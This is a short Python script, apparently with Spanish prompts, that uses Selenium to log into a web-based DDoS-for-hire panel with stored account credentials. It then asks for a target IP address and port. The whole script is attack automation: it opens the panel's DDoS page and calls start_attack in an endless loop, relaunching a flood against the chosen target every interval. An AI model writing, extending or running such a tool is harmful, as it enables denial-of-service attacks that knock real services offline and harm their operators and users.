from selenium import webdriver
from selenium.common.exceptions import *

import time
import traceback
from rich.console import Console
import logging

from bot import Bot
from config import Config
from utils.presets import Presets
import utils.start




config = Config()

main_logger = logging.getLogger()
main_logger.addHandler(logging.FileHandler(config.logs["main"]))
main_logger.setLevel(logging.DEBUG)

presets = Presets(driver_type=config.driver)
service, options = presets.debug()



try:
    driver = webdriver.Chrome(service=service, options=options)
except AttributeError as e:
    raise e


info = {
    "cookies": [
        ...
    ],
    "username": config.accounts[0][0],
    "password": config.accounts[0][1],
    "userAgent": config.user_agents[0]
}





def get_user_input():
    console = Console()

    ip = console.input(f"Ingrese la dirección IP (por defecto: {config.attack['ip']}): ")
    if ip == "":
        ip = config.attack["ip"]

    port = console.input(f"Ingrese el puerto (por defecto: {config.attack['port']}): ")
    if port == "":
        port = config.attack["port"]

    return ip, port

ip, port = get_user_input()



main_logger = logging.getLogger()
main_logger.addHandler(logging.FileHandler(config.logs["main"]))
main_logger.setLevel(logging.DEBUG)

bot = Bot(driver=driver, info=info, main_logger=main_logger)
bot.login_form()
bot.DDoS_page()
bot.close_button()

i = 1
while True:
    
    try:
        bot.start_attack(ip, port, config.attack["time"], config.attack["method"])
        print(f"ejecución: {i}")
        time.sleep(config.attack["time"])
        #bot.stop_attack(bot.get_running_attacks(bot.get_cookies())["running"][0]["id"])
    except Exception as e:
        traceback.print_exc()
    finally:
        i = i + 1
